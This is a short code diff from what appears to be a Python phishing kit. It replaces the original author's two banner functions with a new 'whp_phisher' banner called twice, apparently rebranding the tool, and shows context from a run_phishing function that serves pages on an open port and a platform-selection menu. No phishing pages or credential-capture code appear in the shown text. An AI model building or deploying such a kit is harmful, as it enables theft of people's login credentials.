@@ -195,8 +195,8 @@ def run_phishing(platform_data, port, platform_name):
     app.run(host="0.0.0.0", port=port)
 
 def main():
-    hackers_colony_banner()
-    hco_phisher_banner()
+    whp_phisher_banner()
+    whp_phisher_banner()
 
     print(f"{Y}Select a platform:{N}")
     keys = list(platforms.keys())
